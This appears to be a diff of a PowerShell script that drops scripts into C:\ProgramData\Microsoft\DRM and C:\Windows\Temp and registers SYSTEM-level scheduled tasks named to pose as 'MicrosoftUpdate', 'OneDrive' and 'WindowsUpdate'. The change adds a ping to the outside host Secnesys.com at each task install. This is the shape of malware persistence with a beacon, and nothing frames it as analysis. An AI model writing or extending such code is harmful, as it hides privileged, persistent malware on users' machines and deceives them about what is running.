@@ -1,7 +1,4 @@
 function Gen-Info {
-    # CONNECTION
-    Test-Connection -ComputerName Secnesys.com -Count 1
-
     # CREATION
     $alfa_path = "C:\ProgramData\Microsoft\DRM\alfa.ps1"
     $bravo_path = "C:\Windows\Temp\bravo.ps1"
@@ -34,16 +31,19 @@ function Gen-Info {
     
     $task_alfa = "MicrosoftUpdate"
     if (-not (Get-ScheduledTask -TaskName $task_alfa -ErrorAction SilentlyContinue)) {
+        Test-Connection -ComputerName Secnesys.com -Count 1
         Register-ScheduledTask -TaskName $task_alfa -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
     }
     
     $task_bravo = "OneDrive"
     if (-not (Get-ScheduledTask -TaskName $task_bravo -ErrorAction SilentlyContinue)) {
+        Test-Connection -ComputerName Secnesys.com -Count 1
         Register-ScheduledTask -TaskName $task_bravo -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
     }
     
     $task_charlie = "WindowsUpdate"
     if (-not (Get-ScheduledTask -TaskName $task_charlie -ErrorAction SilentlyContinue)) {
+        Test-Connection -ComputerName Secnesys.com -Count 1
         Register-ScheduledTask -TaskName $task_charlie -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
     }
 }
